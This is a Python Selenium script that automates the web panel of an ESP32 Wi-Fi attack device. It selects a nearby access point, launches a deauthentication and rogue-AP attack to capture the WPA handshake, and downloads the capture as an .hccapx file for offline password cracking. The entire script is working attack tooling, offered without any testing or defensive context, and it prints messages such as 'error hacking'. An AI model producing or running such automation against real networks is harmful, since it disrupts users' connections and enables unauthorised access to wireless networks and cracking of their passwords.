from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
import time

def extract_substrings(str_list):
    result=[]
    for s in str_list:
        if '\n' in s:
            i = s.find('\n')
            result.append(s[i + 1:])
    return result

def choose(ap_list : list):
    return 0

def choose_attack_method():
    return "DEAUTH_ROGUE_AP (PASSIVE)"

def choose_time():
    return "20"

def isvisible(element_id):
    try:
        element = driver.find_element(By.ID, element_id)
        if element.is_displayed():
            return 1
        else:
            return 0
    except:
        print(f"Element with ID '{element_id}' **not found**.")


# Path to manually downloaded chromedriver.exe
service = Service(r"C:\chromedriver\chromedriver.exe")
driver = webdriver.Chrome(service=service)
driver.get("http://192.168.4.1")  # Your ESP32 web server URL
time.sleep(5)
if(isvisible("ready")):
    print("Ready.")
    row = driver.find_elements(By.TAG_NAME, "table")[0]
    aplist = extract_substrings(row.text.split(' '))
    print(aplist)
    index = choose(aplist)
    row.find_elements(By.TAG_NAME, "tr")[1+index].click()
    Select(driver.find_element("id", "attack_type")).select_by_visible_text("ATTACK_TYPE_HANDSHAKE")
    method = choose_attack_method()
    Select(driver.find_element("id", "attack_method")).select_by_visible_text(method)
    attack_time = choose_time()
    driver.find_element("id", "attack_timeout").clear()
    driver.find_element("id", "attack_timeout").send_keys(attack_time)
    f = driver.find_elements(By.TAG_NAME, "fieldset")[1].find_elements(By.TAG_NAME, "p")[3].find_element(By.TAG_NAME, "button").click()
    time.sleep(3+int(attack_time))
elif isvisible("running"):
    print("Running.")
elif isvisible("result"):
    print("Result.")
    handshake_data = driver.find_element("id", "result").find_elements(By.TAG_NAME, "pre")
    if(len(handshake_data) == 0):
        error_occured = 1
        print("error hacking")
    else:
        error_occured = 0
        driver2 = webdriver.Chrome(service=service)
        print("handshake file caught")
        driver2.get("http://192.168.4.1/capture.hccapx")
        time.sleep(3)
